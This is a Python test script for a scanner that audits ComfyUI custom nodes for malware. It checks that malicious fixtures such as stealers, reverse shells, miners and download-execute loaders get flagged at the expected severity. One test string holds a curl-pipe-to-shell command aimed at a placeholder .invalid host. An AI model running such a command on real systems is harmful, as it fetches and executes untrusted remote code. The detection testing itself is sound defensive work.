#!/usr/bin/env python3
"""Canary + control tests.

Every mal-* fixture must reach its expected level AND fire its expected pattern; every ok-*
fixture (things popular nodes really do) must scan SAFE; every med-* fixture must surface as
exactly MEDIUM (reviewable, never scored as an attack). The fixtures are inert: hosts are
reserved (.invalid / TEST-NET), credentials are obviously fake, and nothing here is ever
imported or executed by the tests.

    python tests/run.py
"""
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import comfyui_audit as ca  # noqa: E402

EXPECT = {
    "mal-llmvision-shadow-wheel": ("HIGH", "shadow_wheel"),
    "mal-install-curl-sh": ("CRITICAL", "download_execute"),
    "mal-prestartup-stealer": ("CRITICAL", "credential_exfil"),
    "mal-env-exfil": ("CRITICAL", "env_exfil"),
    "mal-remote-exec": ("CRITICAL", "remote_code_exec"),
    "mal-obfuscated-exec": ("CRITICAL", "obfuscated_exec"),
    "mal-reverse-shell": ("CRITICAL", "reverse_shell"),
    "mal-persistence": ("CRITICAL", "persistence"),
    "mal-defender-tamper": ("CRITICAL", "defender_tamper"),
    "mal-miner": ("CRITICAL", "cryptominer"),
    "mal-known-bad-pin": ("HIGH", "known_bad_version"),
    "mal-typosquat": ("MEDIUM", "typosquat"),
    "mal-frontend-exfil": ("CRITICAL", "browser_exfil"),
    "mal-exec-route": ("HIGH", "exec_route"),
    "mal-dropper": ("HIGH", "dropper"),
    "mal-frontend-remote-eval": ("CRITICAL", "download_execute"),
    "mal-install-runs-script": ("CRITICAL", "download_execute"),
}


def main():
    fails = 0
    root = os.path.join(HERE, "fixtures")
    for name in sorted(os.listdir(root)):
        r = ca.scan_node(ca.files_from_dir(os.path.join(root, name)), name)
        ids = sorted({f["id"] for f in r["findings"]})
        if name.startswith("mal-"):
            want, fid = EXPECT[name]
            ok = ca.SEV_ORDER[r["risk_level"]] >= ca.SEV_ORDER[want] and fid in ids
        elif name.startswith("med-"):
            # capability shown for review: must surface, but never as an attack (HIGH+)
            want, fid = "MEDIUM", None
            ok = r["risk_level"] == "MEDIUM"
        else:
            want, fid = "SAFE", None
            ok = r["risk_level"] == "SAFE"
        print("%s %-30s %-8s %s" % ("PASS" if ok else "FAIL", name, r["risk_level"], ",".join(ids)))
        fails += not ok
    missing = set(EXPECT) - set(os.listdir(root))
    for m in sorted(missing):
        print("FAIL %-30s missing fixture" % m)
        fails += 1
    # --text treats a string as load-time Python
    r = ca.scan("import os\nos.system('curl https://x.invalid/a.sh | sh')")
    ok = r["risk_level"] == "CRITICAL"
    print("%s --text download_execute -> %s" % ("PASS" if ok else "FAIL", r["risk_level"]))
    fails += not ok
    # performance: a 5 MB single-line minified bundle must scan quickly
    blob = ("var a=function(b){return b+1};" * 170000)[:5000000]
    t0 = time.time()
    ca.scan_node({"web/js/bundle.js": blob}, "perf")
    dt = time.time() - t0
    ok = dt < 10
    print("%s 5 MB single-line bundle in %.1fs" % ("PASS" if ok else "FAIL", dt))
    fails += not ok
    print("\n%d failure(s)" % fails)
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
